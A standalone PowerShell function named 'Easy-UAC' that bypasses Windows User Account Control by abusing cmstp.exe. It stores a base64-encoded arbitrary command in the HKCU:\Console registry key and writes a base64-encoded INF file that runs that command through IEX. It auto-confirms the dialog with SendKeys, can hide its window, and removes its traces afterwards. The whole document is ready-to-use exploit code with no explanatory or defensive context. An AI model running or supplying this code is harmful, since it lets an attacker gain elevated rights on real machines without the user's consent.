function Easy-UAC {
	[CmdletBinding()]
	Param(
		[Parameter(Mandatory = $true, Position = 0)]
		[ValidateNotNullOrEmpty()]
		[string]
		$Command,
		[Parameter(Mandatory = $false, Position = 1)]
		[switch]
		$Hidden,
		[Parameter(Mandatory = $false, Position = 2)]
		[switch]
		$NoExitHost,
		[Parameter(Mandatory = $false, Position = 3)]
		[switch]
		$NoExitChild,
		[Parameter(Mandatory = $false, Position = 4)]
		[Int64]
		$SleepDuration = 500
	)
	if ($Hidden) {powershell -WindowStyle Hidden -c ""; $hide = "-WindowStyle Hidden"} else {$hide = ""}
	if ($NoExitChild) {$end = "pause"} else {$end = "Exit;Exit;Exit"}
	$encCommand = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($Command))
	$Path = $env:TEMP + '\A.ini'
	$Value = "powershell $hide -c Remove-Item $Path -Fo;Remove-ItemProperty -Pa 'HKCU:\Console' -N 'X' -Fo;powershell ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('" + $encCommand + "')));$end"
	New-ItemProperty -Path 'HKCU:\Console' -Name 'X' -Value $Value -Force
	[IO.File]::WriteAllBytes($Path, [Convert]::FromBase64String('W3ZlcnNpb25dDQpTaWduYXR1cmU9JGNoaWNhZ28kDQpBZHZhbmNlZElORj0yLjUNCg0KW0RlZmF1bHRJbnN0YWxsXQ0KQ3VzdG9tRGVzdGluYXRpb249Q3VzdEluc3REZXN0U2VjdGlvbkFsbFVzZXJzDQpSdW5QcmVTZXR1cENvbW1hbmRzPVJ1blByZVNldHVwQ29tbWFuZHNTZWN0aW9uDQoNCltSdW5QcmVTZXR1cENvbW1hbmRzU2VjdGlvbl0NCnBvd2Vyc2hlbGwgLWMgIklFWCgoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVTpcQ29uc29sZScpLlgpIg0KdGFza2tpbGwgL0lNIGNtc3RwLmV4ZSAvRg0KDQpbQ3VzdEluc3REZXN0U2VjdGlvbkFsbFVzZXJzXQ0KNDkwMDAsNDkwMDE9QWxsVVNlcl9MRElEU2VjdGlvbiwgNw0KDQpbQWxsVVNlcl9MRElEU2VjdGlvbl0NCiJIS0xNIiwgIlNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEFwcCBQYXRoc1xDTU1HUjMyLkVYRSIsICJQcm9maWxlSW5zdGFsbFBhdGgiLCAiJVVuZXhwZWN0ZWRFcnJvciUiLCAiIg0KDQpbU3RyaW5nc10NClNlcnZpY2VOYW1lPSJOZXR3b3JrIFNlcnZpY2UiDQpTaG9ydFN2Y05hbWU9Ik5ldHdvcmsgU2VydmljZSI='))
	Get-Process -Name 'cmstp.exe' -ErrorAction SilentlyContinue | Stop-Process -Force
	cmstp.exe /au $Path
	$WSH = New-Object -ComObject WScript.Shell
	$WSH.AppActivate('Network Service')
	Start-Sleep -Milliseconds $SleepDuration
	$WSH.SendKeys('{ENTER}')
	pause
	Remove-ItemProperty -Path 'HKCU:\Console' -Name 'X' -Force
	Remove-Item $Path
	if (!$NoExitHost) {Exit;Exit;Exit}
}